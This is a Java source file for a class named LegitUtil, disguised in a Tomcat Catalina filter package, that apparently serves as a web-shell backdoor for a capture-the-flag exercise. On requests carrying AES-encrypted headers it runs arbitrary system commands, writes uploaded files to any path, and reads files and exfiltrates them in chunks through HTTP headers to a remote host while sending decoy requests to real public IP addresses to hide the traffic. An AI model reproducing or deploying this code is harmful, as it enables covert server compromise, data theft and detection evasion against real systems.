package com.tomcat.catalina.filter;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletException;
import javax.servlet.http.*;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.security.SecureRandom;
import java.util.*;



public class LegitUtil {
    private  byte[] staticKey;
    private  byte[] staticIV;
    private  String remoteUrl;
    private  String headerMode;
    private  String headerPayload;
    private static final SecureRandom RAND = new SecureRandom();

    private static final List<String> DECOY_IPS = Arrays.asList(
            "104.23.204.155", "149.104.101.43","104.18.113.12", "45.33.32.156", "104.20.249.100", "185.199.108.153",
            "198.41.155.12", "198.41.190.89", "151.101.65.69", "198.41.130.45", "8.8.8.8",
            "110.233.14.241:8101","110.4.178.160:80","110.4.178.160:81","110.4.178.160:82","172.105.9.180","148.68.201.146:8080","119.240.241.210:81","119.240.241.210:82","172.232.186.145","45.77.4.152","192.121.87.24:84","192.121.87.24:100","192.121.87.24:88","20.250.129.4:9200","91.189.91.48","91.189.91.49","185.125.190.97","185.199.108.153","13.33.255.254","149.104.101.42","151.101.21.224","172.64.145.237","104.20.55.206","151.101.1.75","45.33.32.156","104.18.42.119","104.18.113.12","34.117.59.81"
    );

    private  String[] keywords = {"cdn", "api", "assets", "images", "media", "static", "resources", "v1", "icons"};
    private String[] fileExtensions = {"jpg", "png", "gif"};
    private  String[] fileNames = {
            "data", "gift-image", "statistics", "banner", "logo", "product-info", "offers", "user-avatar",
            "checkout-assets", "promo", "currency-widget", "inventory"
    };
    private static String bytesToHex(byte[] bytes) {
        StringBuilder hexString = new StringBuilder();
        for (byte b : bytes) {
            String hex = Integer.toHexString(0xff & b);
            if (hex.length() == 1) {
                hexString.append('0');
            }
            hexString.append(hex);
        }
        return hexString.toString().toUpperCase();
    }
    private static byte[] hexToBytes(String hexString) {
        int len = hexString.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(hexString.charAt(i), 16) << 4)
                    + Character.digit(hexString.charAt(i+1), 16));
        }
        return data;
    }
    public LegitUtil(String decryptKey) throws Exception {
        // Decrypt pre-defined static config using initKey
        byte[] key = hexToBytes(decryptKey);
        byte[] iv = reverse(hexToBytes(decryptKey));
        //Arrays.copyOf(decryptKey.getBytes(StandardCharsets.UTF_8), 16); //D95E25CF94741E715F41E52CEA15E3DC
        System.out.println("Received key: " + decryptKey );
        System.out.println("Byte form of key: " + bytesToHex(key) );
//        System.out.println("IV: " + Arrays.toString(iv));
        System.out.print("Byte form of IV: " + bytesToHex(iv));
//        for (byte b : iv) {
//            System.out.printf("%02X", b);
//        }
//        System.out.println();
        System.out.println("=====================");

        this.staticKey = decryptAESBytes(Base64.getDecoder().decode("5wgvKujfUbE2FMPa2CTw8Bc81/io859cVznv25fSkOo="),key,iv); // "CTF2025_SecretK!"
        System.out.println("[-] Statickey: " + bytesToHex(staticKey));
        this.staticIV = decryptAESBytes(Base64.getDecoder().decode("nUlRoUl8mo83eTn/Vz0Pn4xTY4bZoMavkMUufpL7Jx0="),key,iv); // "CTFMEM_STATIC_IV"
        System.out.println("[-] staticIV: " + bytesToHex(staticIV));
        this.remoteUrl = decryptAES(Base64.getDecoder().decode("jZyW7DkfPqud6IGvX+ezXhxarFVbMHxXVCGksr7RJkY="),key,iv); // "http://192.168.45.1"
        System.out.println("[-] remoteUrl: " + remoteUrl );
        this.headerMode = decryptAES(Base64.getDecoder().decode("X7b8wCG2lku6ik8s1Cgulg=="),key,iv); // "X-App-Operation"
        System.out.println("[-] headerMode: " + headerMode );
        this.headerPayload = decryptAES(Base64.getDecoder().decode("WYqMNv+s0QOD3PmFk8EfKg=="),key,iv); // "X-App-Cookie"
        System.out.println("[-] headerPayload: " + headerPayload );
    }
    public LegitUtil() {
        // Possibly set default values or leave empty
    }

    public int checkHeader(HttpServletRequest req, HttpServletResponse res, String header)
            throws IOException, ServletException {

        String mode = req.getHeader(headerMode);
        String encryptedPayload = req.getHeader(headerPayload);

        if (mode == null) {
            return 1;
        }

        try {
            String decryptedData = decryptAES(Base64.getDecoder().decode(encryptedPayload),staticKey,staticIV);

            if ("1".equals(mode)) {
                res.getWriter().write("[+] Decrypted command: " + decryptedData + "\n");
                String output = runCommand(decryptedData);
                res.getWriter().write("[+] Raw command output: \n" + output);

                byte[] encryptedOutput = encryptAES(output);
                String base64Out = Base64.getEncoder().encodeToString(encryptedOutput);
                res.getWriter().write("[+] Encrypted Output Length: " + encryptedOutput.length + "\n");
                res.getWriter().write("[+] Encrypted & Base64 Output:\n" + base64Out);

            } else if ("2".equals(mode)) {
                File f = new File(decryptedData);
                if (!f.exists()) {
                    res.setStatus(HttpServletResponse.SC_NOT_FOUND);
                    res.getWriter().write("File not found");
                    return 2;
                }

                byte[] data = Files.readAllBytes(f.toPath());
                byte[] encrypted = encryptAES(new String(data, StandardCharsets.UTF_8));
                String base64Encoded = Base64.getEncoder().encodeToString(encrypted);
                System.out.println("[+] Base64 encoded file content1: " + base64Encoded);

                int chunkSize = 500;
                List<String> headers = Arrays.asList("Authorization", "Cookie", "Token", "X-Author");
                int headerIndex = 0;


                for (int i = 0; i < base64Encoded.length(); i += chunkSize) {

                    // Decoy request
                    List<String> fakeUrls = generateFakeUrls();
                    for (String fakeUrl : fakeUrls) {
                        String fakeData = generateRandomBase64Chunk(chunkSize);
                        String headerName = headers.get(headerIndex % headers.size());
                        headerIndex++;
                        try {
                            System.out.println("[-] Sending decoy request: " + fakeUrl);
                            sendChunkViaHeader(fakeUrl, headerName, fakeData);
                        } catch (Exception e) {
                            System.out.println("[-] Error sending decoy request: " + fakeUrl + "\nMessage: " + e.getMessage());
                        }
                    }


                    //Real request
                    int end = Math.min(i + chunkSize, base64Encoded.length());
                    String chunk = base64Encoded.substring(i, end);
                    String headerName = headers.get(headerIndex % headers.size());
                    headerIndex++;
                    sendChunkViaHeader(remoteUrl + "/assets/gift.png", headerName, chunk);
                }

                res.getWriter().write("[+] Header-based exfiltration done");
            }
            else if ("3".equals(mode)) {
                String filePathEnc = encryptedPayload;
                String fileDataEnc = req.getParameter("data");

                if (filePathEnc == null || fileDataEnc == null) {
                    res.setStatus(HttpServletResponse.SC_BAD_REQUEST);
                    res.getWriter().write("[-] Missing file path or data\n");
                    res.getWriter().write("[-] File path enc: "+filePathEnc);
                    res.getWriter().write("\n[-] Data: " + fileDataEnc);
                    return 1;
                }

//                try {
                    // Decrypt file path and content
                    byte[] filePathBytes = Base64.getDecoder().decode(filePathEnc);
                    byte[] fileDataBytes = Base64.getDecoder().decode(fileDataEnc);

                    String filePath = decryptAES(filePathBytes,staticKey,staticIV);
                    byte[] fileContent = decryptAESBytes(fileDataBytes,staticKey,staticIV);

                    // Write file
                    File file = new File(filePath);
                    File parentDir = file.getParentFile();
                    if (parentDir != null && !parentDir.exists()) {
                        parentDir.mkdirs(); // Create directory if needed
                    }

                    try (FileOutputStream fos = new FileOutputStream(file)) {
                        fos.write(fileContent);
                    }

                    res.getWriter().write("[+] File uploaded to: " + filePath + "\n");
                    res.getWriter().write("[+] Size: " + fileContent.length + " bytes\n");

//                } catch (Exception e) {
//                    res.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
//                    res.getWriter().write("[-] Upload failed: " + e.getMessage() + "\n");
//                }
            }

            else {
                return 1;
            }
        } catch (Exception e) {
            res.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
            res.getWriter().write("[-] Exception: " + e.getMessage());
            e.printStackTrace();
            return 2;
        }
        return 0;
    }

    private void sendChunkViaHeader(String urlStr, String header, String chunk) throws IOException {
        URL url = new URL(urlStr);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("GET");
        conn.setConnectTimeout(5000);
        conn.setReadTimeout(5000);
        conn.setRequestProperty(header, chunk);
        conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
        conn.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
        conn.getResponseCode();
        conn.disconnect();
    }

    private String generateRandomBase64Chunk(int length) {
        byte[] randomBytes = new byte[length * 3 / 4];
        RAND.nextBytes(randomBytes);
        return Base64.getEncoder().encodeToString(randomBytes);
    }

    private  List<String> generateFakeUrls() {
        Random rand = new Random();
        List<String> urls = new ArrayList<>();
        int randomURLNumber = rand.nextInt((15 - 5)) + 5;
        System.out.println("Number of random: " + randomURLNumber);
        for (int i = 0; i < randomURLNumber; i++) {
            String ip = DECOY_IPS.get(rand.nextInt(DECOY_IPS.size()));
            String keyword = keywords[rand.nextInt(keywords.length)];
            String fileName = fileNames[rand.nextInt(fileNames.length)];
            String ext = fileExtensions[rand.nextInt(fileExtensions.length)];
            String url = "http://" + ip + "/" + keyword + "/" + fileName + "." + ext;
            urls.add(url);
        }

        return urls;
    }

    private String runCommand(String cmd) throws IOException {
        Process proc = Runtime.getRuntime().exec(cmd);
        BufferedReader reader = new BufferedReader(new InputStreamReader(proc.getInputStream()));
        StringBuilder output = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null)
            output.append(line).append("\n");
        reader.close();
        return output.toString();
    }
    private byte[] reverse (byte[] a ){
        byte[] bytes = a;
        for (int i = 0; i < bytes.length / 2; i++) {
            byte temp = bytes[i];
            bytes[i] = bytes[bytes.length - 1 - i];
            bytes[bytes.length - 1 - i] = temp;
        }
        return bytes;
    }
    private byte[] encryptAES(String input) throws Exception {
        SecretKeySpec key = new SecretKeySpec(staticKey, "AES");
        IvParameterSpec iv = new IvParameterSpec(staticIV);
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.ENCRYPT_MODE, key, iv);
        return cipher.doFinal(input.getBytes(StandardCharsets.UTF_8));
    }

    private byte[] decryptAESBytes(byte[] encrypted, byte[] a, byte[] b) throws Exception {
        SecretKeySpec key = new SecretKeySpec(a, "AES");
        IvParameterSpec iv = new IvParameterSpec(b);
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.DECRYPT_MODE, key, iv);
        return cipher.doFinal(encrypted);
    }
    private String decryptAES(byte[] encrypted, byte[] a, byte[] b) throws Exception {
        return new String(decryptAESBytes(encrypted, a,b), StandardCharsets.UTF_8);
    }

    public  String getModeHeader (){
        return headerMode;
    }
    public  String getPayloadHeader (){
        return headerPayload;
    }

}
